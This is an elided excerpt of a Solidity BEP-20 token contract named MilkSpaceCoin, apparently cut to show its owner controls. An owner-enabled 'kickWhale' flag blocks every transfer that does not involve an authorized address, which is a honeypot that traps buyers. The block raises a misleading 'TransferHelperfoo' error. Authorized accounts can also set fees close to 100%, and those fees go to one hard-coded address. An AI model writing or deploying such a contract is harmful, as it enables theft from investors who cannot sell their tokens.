...
abstract contract Auth {
    ...
    function batchAuthorize(address[] calldata _addresses, bool status) public onlyOwner{
        for (uint i = 0; i < _addresses.length; i++) {
            if(status == true){
                authorize(_addresses[i]);
            }else{
                unauthorize(_addresses[i]);
            }
        }
    }
...
contract MilkSpaceCoin is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "MilkSpaceCoin";
    string constant _symbol = "MSC";
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x935C01F50CB095FFd7FC784c2BaeBa6a2c85e88d;
        ecosystemfeeReceiver = 0x935C01F50CB095FFd7FC784c2BaeBa6a2c85e88d;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(kickWhale){
            require(authorizations[sender] || authorizations[recipient],"TransferHelperfoo: TRANSFER_FROM_FAILED__");                
        }
    ...
    function enable_kickWhale(bool _status) public onlyOwner {
        kickWhale = _status;
    }
    ...
    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _ecosystemfee, uint256 _burnFee, uint256 _feeDenominator) external authorized {
        ...
        require(totalFee < feeDenominator, "To much fee from tolerance fee");
    }
